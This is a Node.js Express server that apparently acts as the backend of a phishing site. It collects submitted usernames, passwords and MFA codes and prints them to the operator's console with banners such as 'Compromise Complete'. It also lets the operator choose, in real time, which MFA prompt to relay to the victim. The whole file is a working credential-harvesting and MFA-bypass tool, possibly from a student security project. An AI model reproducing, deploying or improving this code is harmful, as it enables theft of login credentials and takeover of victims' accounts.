const express = require("express")
const app = express();
const bodyParser = require("body-parser")
const readline = require('readline');

app.use(express.static("public"));
app.use(bodyParser.json());

const hostname = '127.0.0.1';
const port = 3010;

var accounts = []

// https://expressjs.com/en/starter/basic-routing.html
app.get("/", (request, response) => {
  response.sendFile(__dirname + "/views/login.html");
});

/*
Login Handler
*/
app.post("/submit", async (req, res) => {
  var username = req.body.username;
  var password = req.body.password;
  var mfa = req.body.mfa;

  console.log("Received input...");

  // check if account exists
  var found = false;
  var foundIndex = 0;
  for (index = 0; index < accounts.length && found === false; index++) {
    if(accounts[index].username === username) {
      found = true;
      foundIndex = index;
    }
  }
  // update accounts according to "found"
  if (found) {
    console.log("Found existing account... updating entry...");
    accounts[foundIndex].password = password;
    accounts[foundIndex].mfa = mfa;
    // check if all fields set and print out if true
  }
  else {
    console.log("Creating new account entry...");
    var newAccount = {
      username: username,
      password: password,
      mfa: mfa
    }
    accounts.push(newAccount)
  }

  // set up mfa style and translation dict
  var mfa_code = 0;
  var mfa_translation = {
    0: "SMS",
    1: "Call",
    2: "Email",
    3: "TOTP",
    4: "Push Notification"
   }

   // handle request accordingly
   if(mfa !== "") {
     console.log("-----------------------MFA Found--------------------------")
     console.log("Username: ".concat(username))
     console.log("MFA: ".concat(mfa))
     console.log("\nUser redirected!")
     console.log("------------------Compromise Complete---------------------\n")

     const response = {
       status: 200
     }
     res.json(response)
   }
   else if(username !== "" && password !== "") {
    // now handle printing and waiting on admin to provide MFA type
    console.log("---------------------Account Found-----------------------")
    var printout = "Username: ".concat(username)
    printout = printout.concat("\nPassword: ").concat(password)
    console.log(printout)
    console.log("---------------------")
    mfa_code = await waitOnMFA()
    console.log("---------------------")
    printout = "Displaying  ".concat(mfa_translation[mfa_code])
    printout = printout.concat(" to user...")
    console.log(printout)
    console.log("-------------------Awaiting MFA Code----------------------\n")

    // respond once admin has provided mfa code
    const response = {
      status: 200,
      mfa: parseInt(mfa_code)
    }
    res.json(response)
  }
  else {
    // otherwise respond without code (not ready for MQP step)
    const response = {
      status: 200
    }
    res.json(response)
  }
});

function waitOnMFA() {
  // prompt user for code and return promise
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  const query = "MFA Styles Available\n  0: SMS\n  1: Call\n  2: Email\n  3: TOTP\n  4: Push Notificaiton\nWhat MFA does the user have? "
  return new Promise(resolve => rl.question(query, ans => {
    rl.close();
    resolve(ans);
  }))

  return code;
}

process.on('SIGTERM', () => {
  server.close(() => {
    console.log('Process terminated')
  })
})

// listen for requests
const listener = app.listen(port, () => {
  console.log("Your app is listening on port " + listener.address().port);
  console.log("Exit gracefully with CTRL-C...\n")
});
